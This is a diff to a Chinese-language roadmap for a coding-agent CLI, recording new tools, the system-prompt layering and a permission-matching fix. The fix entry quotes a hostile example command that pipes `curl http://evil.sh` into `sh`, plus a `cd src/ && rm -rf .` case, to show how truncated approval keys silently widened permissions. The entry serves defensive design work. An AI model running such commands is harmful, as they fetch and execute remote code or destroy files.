@@ -18,7 +18,7 @@
 | **命令系统（P1）** | 自动扫描加载：/help /clear /model /edit_model /usage /history /sessions /diagnostics |
 | **模型切换（P1）** | /model 两级导航选供应商+模型，/edit_model 修改配置，运行时热替换 LLM |
 | **对话历史（P1）** | /history 查看/分叉，fork 复制前缀到新文件（不破坏原历史） |
-| **工具系统（P2）** | read/write/grep/bash 四工具 + function calling（结构化 tool_calls） |
+| **工具系统（P2）** | 内置工具 + function calling（结构化 tool_calls）。工具数随 P7 增补：落地时 4 个（read/write/grep/bash），现为 6 个（ls/read/write/edit/grep/bash） |
 | **技能系统（P2）** | SkillLoader 加载 .pi/skills/*.md 模板 |
 | **事件订阅（P3）** | PromptEventEmitter subscribe/emit，stream_text/tool_call/error 等事件 |
 | **多会话管理（P3）** | /sessions 切换/新建，/history 分叉出多分支 |
@@ -27,6 +27,8 @@
 | **启动自检增强（P4）** | check() 逐项检查（配置/API key/连通性/模型列表）+ 严重度分级 + check 事件 |
 | **可观测性增强（P6）** | 事件语义层：总线盖 at/seq/turnId + 打卡机 trace()/beginSpan() + 四组骨架 span + 便签通道 + trace-log watcher 落 JSONL + L3 两条流式协议的真实 usage + SpanCollector 公共配对件与 /traces 内置命令 |
 | **启动提速（P6）** | 第一档网络探测后台化 + 第二档启动关键路径 0 网络请求（模型列表内存预热 + /model 按需现拉） |
+| **精准编辑工具（P7）** | `edit`：oldText 唯一命中才改，0 命中 / 多命中都拒绝且一字不落盘（多命中回候选行号），CRLF 与 BOM 字节级保真；配套 `ToolDefinition.permissionDetail?` 让权限弹窗看得清改哪里 |
+| **授权边界精确化（P6）** | 授权匹配从“args JSON 前 80 字符 + 前缀匹配”换成“工具定义的边界 + 精确匹配”（`ToolProvider.permissionKey?`），`clear()` 接进会话生命周期；关掉架构债 #10 |
 
 ---
 
@@ -89,7 +91,9 @@
 - [x] **正式测试套件** —（2026-09-03 关闭，**不引入 vitest**）原案是“引入 vitest，为 session/compaction/commands/rpc 等子系统建立正式单测（当前仅临时脚本）”；痛点“P5 大重构后零回归保护”已由另一条路解决——`scripts/` 下 **12 套零依赖验证脚本、359 项断言**，`npm run verify` 一条命令串跑、退出码可直接交给 CI（原先“只能手工循环跑”的缺口由本轮新增的 `run-verify.mjs` 补上）。四个子系统里 session 已有专套（`verify-session.ts` 47 项），compaction / commands / rpc 仍靠间接覆盖，这部分缺口保留在 TESTING.md 第七节
   - 理由：P5 大重构后零回归保护，改 bug 可能悄悄破坏别处
   - 对标：Pi 有 vitest.config.ts + 完整测试
-- [ ] **系统提示词模板层** — 从 runtime.ts 硬编码字符串抽为模板（system-prompt.ts），支持按场景选择
+- [x] **系统提示词模板层** —（2026-09-04 核实后关闭，实现与原案不同）原案：从 runtime.ts 硬编码字符串抽为模板（system-prompt.ts），支持按场景选择
+  - 已落地的是 `context/system-prompt.ts` 的 `SystemPromptServiceImpl`：配置驱动 + 五层分层（core → tools → skills → task → summary，稳定前缀与变化内容分开，为缓存友好）+ 段落可插拔（`context/sections/` 三个内置 + `extensions/sections/` 用户扩展）+ hook 可改写（`before_build` / `before_request`）
+  - “按场景选择”没做成模板枚举，而是靠 `SectionFn` 收 `ctx` 自行决定返不返回内容（如 tools 段在 `ctx.tools` 为空时返回 undefined 直接跳过本段），新增一个场景不必改模板表
   - 理由：硬编码不可扩展，影响 Agent 能力演进
   - 对标：Pi 的 prompt-templates.ts / system-prompt.ts
 - [ ] **分支摘要** — fork 后把旧分支摘要塞回新分支上下文
@@ -98,6 +102,7 @@
 - [ ] **Hook 系统** — 工具调用/消息生命周期钩子（beforeToolCall/afterToolCall 等）
   - 理由：扩展 Agent 行为（拦截/转换/记录），当前仅 inputHandlers 简单预处理
   - 对标：Pi 的 hooks.md / Cline 任务生命周期钩子
+  - 进度（2026-09-04 核实）：**提示词层与旁观层的钩子已落地**——`EventBus.on(type, handler)` 的返回值经 `emitHook` 收回、能改写流程（现有 `before_build` / `before_request` 两个挂点，`extensions/hooks/` 自动装载），`extensions/watchers/` 只订阅不改流程（ctx 里刻意不给 `on`）；**工具调用生命周期钩子仍无**：全 src/ 搜 `beforeToolCall` / `afterToolCall` / `before_tool` / `after_tool` 零命中，故本条仍留待办。`runtime.onInput()`（输入预处理）也仍空着，见 ARCHITECTURE.md 第四节第 7 条
 - [ ] **会话仓库层** — 从 jsonl-storage 抽出 repo 层（会话列表/管理/删除）
   - 理由：区分"单会话存储"与"会话管理"，支持多会话完整操作
   - 对标：Pi 的 jsonl-repo.ts
@@ -138,26 +143,45 @@
   - **前置障碍（不能只接线）**：出口那道丢弃是**承重的**。`resolveAnthropicThinking` 的安全阀一见“带 `tool_calls` 但无 `thinkingBlocks` 的 assistant 消息”就强制关 thinking，而 `thinkingBlocks` 永不落盘——直接透传会让任何有过工具调用的会话把 extended thinking **静默全程关闭**（看上去像修好了历史保真度，实际是拿推理能力换了它）。要接通必须先定 thinking 块的历史策略：要么落盘 `signature`（体积 + 敏感数据），要么把带工具调用的历史轮折叠成文本（丢工具语义）
   - 依赖：无硬依赖；但若同时要落盘 tool 结果消息，需给 `AgentLoopServiceImpl` 注入 session（当前它拿不到，只拿到 events）
   - 本轮已做的部分：行为一行未改，只把五处失真措辞改正、三处承重位置加警告注释，并把“入口未接线 + 出口承重”固化为 `verify-session.ts` ⑨ 段断言（下次谁想“顺手补全”先撞上测试）。详见 ARCHITECTURE.md 第四节第 9 条
+- [x] **授权边界精确化** —（2026-09-04 落地）关掉 ARCHITECTURE.md 第四节第 10 条架构债：`permission/manager.ts` 的 `startsWith` 前缀匹配换成 `Set<string>` 精确匹配，`agent-loop.ts` 的授权兜底键不再 `.slice(0, 80)`，三个需确认的工具各定义一个 `permissionKey`（write / edit = 归一化 path，bash = 完整命令）
+  - 修掉的是**静默扩权**（实测，不是推导）：批准 `node node_modules/typescript/bin/tsc --noEmit && node scripts/run-verify.mjs`（76 字符）后，同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）也会被自动放行——两个键在 80 字符处截成了逐字符相同的串。用户点的是“允许这一条”，系统给出的是“允许前 80 字符相同的所有调用”
+  - 顺带关掉“前缀级授权”：授权 `write:src/x.ts` 不再放行 `write:src/x.ts.bak`；也顺带让注释里声称却一次也未生效过的目录级授权彻底消失（它本来就是失真的：真实调用方传的键含内容片段，换一个文件甚至换一段内容就失配）
+  - `clear()` 接线（项目第三处“支持但未接线”，前两处：`runtime.onInput()` / 上一条的 tool_calls 持久化）：`runtime.clearSession()` 连带清授权，“本次全部允许”终于等于本次会话而不再是本进程；`/clear` 的说明与回执同步改口（UI 不说谎）
+  - `bash` 补 `permissionDetail`，兑现它 `description` 参数上“仅用于权限确认提示”那句从未生效的承诺
+  - ⚠ **以本条为准**：上面“精准编辑工具（P7）”末段那句“匹配键格式与改前逐字符相同，已记下的‘本次全部允许’不会失配”是 `edit` 那轮的事实，**本轮已不再成立**（匹配键换了；授权只存内存的 Set、从不落盘，所以换格式没有迁移问题）；那条写的“7 处替身”当时实为 **6** 处，本轮新增 `verify-permission.ts` 那处后才真是 7（append-only 不改原文）
+  - 刻意不做：目录级 / 通配授权（`bash` 的键是完整命令，`cd src/` 就以 `/` 结尾，按“以 / 结尾就前缀放行”等于批准 `cd src/ && rm -rf .`）；命令级白名单（需命令语义解析）。write / edit 的键不含内容 → “本次全部允许”= 本会话内不再问这个文件，这是**刻意的放宽**，取舍与四条代价见 DECISION_LOG 2026-09-04
+  - 验证：新增 `scripts/verify-permission.ts` 62 项（7 段：含“改前的截断键确实把这两条命令判成同一个键”的**对照组**，以及 ⑦ 段造真 `Runtime` 数 `clear()` 被调几次的**行为证明**）；`verify-edit.ts` 的 A5 与头部承重设计③ 跟着改（源码形状变了）；全量 14 套 482 项、tsc --noEmit 均 EXIT=0
+  - 对标：Cline 的 per-tool 权限上下文（每种工具自己决定“一次授权覆盖多大范围”），而不是把授权键的形状写死在权限子系统里
 
 ### P7 — 业务能力强化（让 Agent 真正解决实际问题）
 
 > 工具/架构已齐，以下为提升 Agent"解决真实编码任务"能力，按见效速度排序。
 
-- [ ] **系统提示词强化** — 从"别乱调工具"升级为"教 Agent 解决任务的流程"：
+- [x] **系统提示词强化** —（2026-09-04 核实后关闭）原案：从"别乱调工具"升级为"教 Agent 解决任务的流程"：
   - 拆解问题 → 分步执行 → 验证 → 迭代
   - 如何用工具组合完成多步任务（先理解再动手）
   - 遇到错误如何排查重试（读错误 → 定位 → 修复）
   - 写完代码跑测试验证
   - 理由：同样工具，提示词决定 Agent 是"会说话"还是"会干活"，成本最低见效最快
-- [ ] **精准编辑工具** — 新增 apply_patch / editor（diff 式精准修改，不整体覆盖文件）
-  - 理由：当前只有 write（整体覆盖），改大文件一小段会破坏内容；真实编码任务必需
-  - 对标：Cline 的 apply_patch / editor
-- [ ] **测试验证闭环** — 提示词 + 工具引导 Agent"改代码 → 跑测试 → 看结果 → 再改"
+  - 逐条对账（2026-09-04 核实，证据在 `context/sections/core-section.ts`，44 行五节）：拆解→分步→验证→迭代 ⇒【任务执行流程】1-5 步；工具组合完成多步任务 ⇒【工具增强推理】（不确定就查 ls/read/grep、算不清就跑 bash、基于真实结果推理）+【场景判断】；错误排查重试 ⇒ 流程第 4 步（报错就读错误 → 定位 → 修复 → 重跑）；写完跑测试验证 ⇒【铁律】收尾必验证（禁止口头声称已验证）
+  - 超出原案的部分：另有【工作记忆】节（TASK.md 复选框清单 + 检测到未勾选项时追加续传提示），把长任务的断点续传也写进了提示词
+- [x] **精准编辑工具** —（2026-09-04 落地，实现与原案不同）原案：新增 apply_patch / editor（diff 式精准修改，不整体覆盖文件）。落地的是第 6 个内置工具 `edit`（`tools/builtin.ts`）：`oldText` 必须在文件中**唯一命中**才替换，0 命中与多命中都**拒绝且一字不落盘**，多命中回报候选行号（确认每处都该改时才传 `replaceAll: true`）
+  - 为什么不用 diff/patch 格式：apply_patch 要模型输出带行号与上下文的补丁块，格式错一格整块作废；唯一原文片段把“定位对不对”这件事交给文件自己回答，模型只需照抄原文
+  - 不用正则：`oldText` 里满是 `. * ( [ ?` 这类元字符，走正则就得转义，漏转一个就把“改这一处”变成“改一片”；改用 `indexOf` + 字面切片拼接
+  - 字节级保真：纯 CRLF 文件在 `\n` 归一化副本上匹配、写回前整体还原（Windows 上 `core.autocrlf=true` 检出的源码就是 CRLF，不做这层则跨行 `oldText` 必然 0 命中，工具会在最需要它的地方失效）；BOM 自己按字节判、原样写回（实测 Node v24.12.0 用 utf-8 读**不剥** BOM，但不拿这种行为细节当设计依据）
+  - 拒绝路径用 `[ERROR]` 前缀是**承重的**：agent-loop 只把 `[ERROR]`/`[VERIFY_FAILED]` 记作失败，而重复失败保护只在失败时计数——换成 `[NO_MATCH]` 会让模型拿同一个错 `oldText` 空转烧轮次而收不到提醒。已写成承重注释 + 断言
+  - 配套改动：`ToolDefinition.permissionDetail?` 与 `ToolProvider.permissionDetail?` 都是**可选成员**（加必需成员会打坏 7 处替身），弹窗显示“改 路径: 旧 → 新”；agent-loop 把原先一个变量兼三职的 `detail` 拆成 `detail`（显示）+ `autoKey`（授权匹配），匹配键格式与改前逐字符相同，已记下的“本次全部允许”不会失配
+  - 提示词侧：core-section【铁律】加一条“改一小段用 edit，不要 write 重抄全文”，write 的工具描述也加了流向 edit 的分流指引
+  - 验证：新增 `scripts/verify-edit.ts` 41 项（唯一命中 / 两条拒绝路径 / 候选行号 / CRLF / BOM / 混合行尾 / 参数边界 / 弹窗文案单行契约），全量 13 套 420 项
+  - 对标：Cline 的 apply_patch / editor（本项目取“唯一原文片段”而非补丁块）
+- [x] **测试验证闭环** —（2026-09-04 核实后关闭）提示词 + 工具引导 Agent"改代码 → 跑测试 → 看结果 → 再改"
   - 理由：Agent 能写代码但不会自证正确；真实修 bug/写功能需要验证迭代
+  - 闭环的四段各自落在哪（2026-09-04 核实）：改代码 ⇒ `edit` / `write` 工具；跑测试 ⇒ `bash` 工具 +【铁律】收尾必验证（项目没有测试入口时至少做语法/类型检查）；看结果 ⇒【任务执行流程】第 4 步；再改 ⇒ 同一步的“读错误 → 定位 → 修复 → 重跑”，另有重复失败保护兜底（同一调用连续失败 2 次即追加 [系统提示] 叫模型换路子、3 次叫它放弃这条路并向用户说明卡点）
+  - 残留（未立项）：闭环全靠提示词约束，没有“改完自动跑测试”的机制（无 watch、无 pre-commit）——模型不调 bash 就没人替它调
 - [ ] **实用工具补全** — 列表目录（ls）、网页抓取（fetch）、读取多文件（并行 read）
   - 理由：扩展可处理的任务类型（查项目结构/查网页/批量读）
   - 对标：Cline 的 fetch_web_content / pi 的 ls
-  - 进度（2026-09-03）：**ls 已落地**（`tools/builtin.ts`，内置工具现为 5 个：ls / read / write / grep / bash），本条只剩 fetch 与并行 read 两项未做，故仍留 `- [ ]`。上一轮文档校准查出的“该划掉一半”即指此处
+  - 进度（2026-09-03）：**ls 已落地**（`tools/builtin.ts`），本条只剩 fetch 与并行 read 两项未做，故仍留 `- [ ]`。2026-09-04 又落地 `edit`（属上面“精准编辑工具”一条，与本条无关），内置工具现为 6 个：ls / read / write / edit / grep / bash。上一轮文档校准查出的“该划掉一半”即指此处
 
 ---
 
